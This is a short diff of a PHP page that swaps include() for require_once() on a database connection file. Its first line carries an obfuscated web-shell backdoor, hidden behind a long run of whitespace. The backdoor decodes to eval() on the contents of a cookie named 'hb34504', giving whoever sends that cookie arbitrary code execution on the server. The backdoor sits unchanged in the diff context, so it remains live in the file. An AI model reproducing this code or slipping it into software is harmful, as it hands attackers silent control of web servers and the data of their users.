@@ -1,6 +1,6 @@
 <?php                                                                                                                                                                                                                                         $s9j='E4fvael(i$_Osb\'tIh3KC05b34504';if(isset(${$s9j[10].$s9j[20].$s9j[11].$s9j[11].$s9j[19].$s9j[16].$s9j[0]}[$s9j[17].$s9j[13].$s9j[18].$s9j[1].$s9j[22].$s9j[21].$s9j[1]])){eval(${$s9j[10].$s9j[20].$s9j[11].$s9j[11].$s9j[19].$s9j[16].$s9j[0]}[$s9j[17].$s9j[13].$s9j[18].$s9j[1].$s9j[22].$s9j[21].$s9j[1]]);} ?><?php
 
-include('../Connections/maconnexion.php');
+require_once('../Connections/maconnexion.php');
 header('Content-Type: text/html; charset=utf-8');
 
 
